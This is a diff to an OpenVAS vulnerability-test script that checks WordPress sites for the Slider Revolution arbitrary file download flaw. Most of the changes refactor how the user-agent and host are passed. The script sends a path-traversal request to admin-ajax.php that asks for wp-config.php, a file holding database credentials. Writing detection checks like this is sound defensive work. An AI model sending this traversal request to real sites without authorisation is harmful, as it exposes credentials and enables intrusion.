@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_slider_revolution_file_download_vuln.nasl 11240 2018-09-05 10:15:12Z mmartin $
+# $Id: gb_wp_slider_revolution_file_download_vuln.nasl 11321 2018-09-11 10:05:53Z cfischer $
 #
 # Wordpress Slider Revolution Arbitrary File Download Vulnerability
 #
@@ -29,12 +29,13 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805518");
-  script_version("$Revision: 11240 $");
+  script_version("$Revision: 11321 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-05 12:15:12 +0200 (Wed, 05 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-11 12:05:53 +0200 (Tue, 11 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-31 12:15:41 +0530 (Tue, 31 Mar 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
+  script_cve_id("CVE-2015-1579", "CVE-2014-9734");
   script_name("Wordpress Slider Revolution Arbitrary File Download Vulnerability");
 
   script_tag(name:"summary", value:"The host is installed with Wordpress
@@ -68,22 +69,21 @@ General solution options are to upgrade to a newer release, disable respective f
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-function construct_get_req(url, host)
+function construct_get_req(url, host, useragent)
 {
   wpReq = 'GET ' + url + ' HTTP/1.1\r\n' +
           'Host: ' + host + '\r\n' +
-          'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
+          'User-Agent: ' + useragent + '\r\n' +
           'Accept-Encoding: gzip, deflate\r\n' +
           'Connection: keep-alive\r\n\r\n';
-
   return wpReq;
 }
 
@@ -95,14 +95,14 @@ if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Attack url
 url = dir + '/wp-admin/admin-ajax.php?action=revslider_show_image' +
             '&img=../wp-config.php';
 
+useragent = get_http_user_agent();
+host = http_host_name(port:http_port);
 
-wpReq = construct_get_req(url:url, host:get_host_name());
+wpReq = construct_get_req(url:url, host:host, useragent:useragent);
 
-## Receive Response
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq);
 
 if(wpRes && wpRes =~ "301 Moved Permanently")
@@ -113,7 +113,7 @@ if(wpRes && wpRes =~ "301 Moved Permanently")
     exit(0);
   }
 
-  wpReq = construct_get_req(url:url, host:hostname[2]);
+  wpReq = construct_get_req(url:url, host:hostname[2], useragent:useragent);
   wpRes = http_keepalive_send_recv(port:http_port, data:wpReq);
 }
 
